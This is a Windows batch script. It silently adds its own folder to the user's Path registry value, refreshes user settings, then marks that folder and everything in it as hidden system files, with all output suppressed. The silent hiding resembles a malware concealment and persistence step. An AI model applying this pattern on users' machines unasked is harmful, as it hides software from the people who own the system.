@echo off
setlocal DisableDelayedExpansion

set "SPACE_DIR=%~dp0"
if "%SPACE_DIR:~3,1%"=="" (
    set "SPACE_DIR=%SPACE_DIR%."
) else (
    set "SPACE_DIR=%SPACE_DIR:~0,-1%"
)

powershell.exe -NoProfile -NonInteractive -Command "$ErrorActionPreference = 'Stop'; try { $key = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey('Environment', $true); if ($null -eq $key) { $key = [Microsoft.Win32.Registry]::CurrentUser.CreateSubKey('Environment') }; if ($null -eq $key) { throw 'Unable to open the user environment registry key' }; try { $exists = $key.GetValueNames() -contains 'Path'; if ($exists) { $path = [string]$key.GetValue('Path', $null, [Microsoft.Win32.RegistryValueOptions]::DoNotExpandEnvironmentNames); $kind = $key.GetValueKind('Path'); if ($kind -notin @([Microsoft.Win32.RegistryValueKind]::String, [Microsoft.Win32.RegistryValueKind]::ExpandString)) { throw 'Unsupported user Path registry value type' } } else { $path = ''; $kind = [Microsoft.Win32.RegistryValueKind]::ExpandString }; $directory = [IO.Path]::GetFullPath($env:SPACE_DIR).TrimEnd('\'); if ($directory.Length -eq 2 -and $directory[1] -eq ':') { $directory += '\' }; $found = $false; foreach ($entry in ($path -split ';')) { $candidate = $entry.Trim().Trim([char]34).TrimEnd('\'); if ($candidate.Length -eq 2 -and $candidate[1] -eq ':') { $candidate += '\' }; if ([string]::Equals($candidate, $directory, [StringComparison]::OrdinalIgnoreCase)) { $found = $true; break } }; if (-not $found) { if ([string]::IsNullOrEmpty($path)) { $path = $directory } else { $path += ';' + $directory }; $key.SetValue('Path', $path, $kind) } } finally { $key.Dispose() }; exit 0 } catch { exit 1 }" >nul 2>&1
if errorlevel 1 exit /b 1

rundll32.exe user32.dll,UpdatePerUserSystemParameters >nul 2>&1

attrib.exe +s +h "%SPACE_DIR%\*" /d >nul 2>&1
if errorlevel 1 exit /b 1
attrib.exe +s +h "%SPACE_DIR%" >nul 2>&1
if errorlevel 1 exit /b 1

exit /b 0
